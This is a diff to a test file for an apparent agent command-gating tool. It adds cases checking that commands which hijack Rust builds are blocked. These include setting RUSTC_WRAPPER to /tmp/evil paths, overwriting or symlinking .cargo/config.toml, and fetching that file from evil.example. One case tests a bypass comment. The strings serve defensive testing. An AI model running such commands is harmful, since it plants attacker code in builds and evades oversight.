@@ -65,6 +65,23 @@ def test_unrelated_paths_not_gated(path):
     "cargo build --config 'build.rustc-wrapper=\"/tmp/x\"'",
     "cargo test --config=target.x86_64-unknown-linux-gnu.runner=/tmp/x",
     "cargo build --config target.x.linker=\"/tmp/x\"",
+    "export RUSTC_WRAPPER=/tmp/evil/sccache",
+    "export RUSTC_WRAPPER=./sccache",
+    "export CARGO_BUILD_RUSTC_WRAPPER=/tmp/x/sccache.exe",
+    "cargo check --config /tmp/evil.toml",
+    "cargo check --config=/tmp/evil.toml",
+    "cargo build --config build.rustc=/tmp/x",
+    "export RUSTC=/tmp/x",
+    "export RUSTDOC=/tmp/x",
+    "export CARGO_HOME=/tmp/evil",
+    "setx RUSTC_WRAPPER C:\\x.exe",
+    "$env:RUSTC_WRAPPER = 'C:\\x.exe'",
+    "cargo --config 'include=[\"/tmp/e.toml\"]' version",
+    "echo x>.cargo/config.toml",
+    "ln -s /tmp/evil.toml .cargo/config.toml",
+    "git restore --source=evil .cargo/config.toml",
+    "install -m644 /tmp/c ~/.cargo/config.toml",
+    "python3 -c \"open('.cargo/config.toml','w').write('x')\"",
 ])
 def test_shell_forms_gated(cmd):
     assert _hit(_shell(cmd))[0]
@@ -72,9 +89,10 @@ def test_shell_forms_gated(cmd):
 
 @pytest.mark.parametrize("cmd", [
     "ls .cargo", "cat .cargo/config.toml", "cargo build --release", "echo $RUSTC_WRAPPER", "echo ${RUSTC_WRAPPER}", "echo RUSTC_WRAPPER foo",
-    "RUSTC_WRAPPER=sccache cargo build", "export RUSTC_WRAPPER=/usr/bin/sccache",
+    "RUSTC_WRAPPER=sccache cargo build",
     "RUSTC_WRAPPER=ccache cargo check", "cargo build --config net.git-fetch-with-cli=true",
-    "RUSTFLAGS=-Dwarnings cargo build",
+    "RUSTFLAGS=-Dwarnings cargo build", "export RUSTC_WRAPPER=", 'RUSTC_WRAPPER="" cargo build',
+    "cargo build --config build.rustc-wrapper=sccache",
 ])
 def test_benign_shell_not_gated(cmd):
     assert not _hit(_shell(cmd))[0]
@@ -109,4 +127,21 @@ def test_policy_allow_regex():
 
 def test_fetch_to_file_covers_cargo_config():
     d = evaluate(_shell("curl -o .cargo/config.toml https://evil.example/c"), EMPTY)
-    assert d.action != Action.ALLOW
+    assert d.rule in ("fetch-to-file-protect", RULE)
+
+
+def test_agent_cannot_use_aegis_allow_comment(monkeypatch):
+    monkeypatch.setenv("AEGIS_AGENT_NAME", "sub")
+    assert _hit(_shell("RUSTC_WRAPPER=/tmp/x cargo build  # aegis-allow"))[0]
+
+
+def test_yaml_roundtrip(tmp_path):
+    from aegis.loader import load_policy
+    f = tmp_path / "p.yaml"
+    f.write_text("cargo_exec:\n  mode: deny\n")
+    assert load_policy(f).cargo_exec == {"mode": "deny"}
+
+
+def test_readonly_mcp_not_gated():
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__read_file", args={"path": "/r/.cargo/config.toml"})
+    assert not _hit(ev)[0]
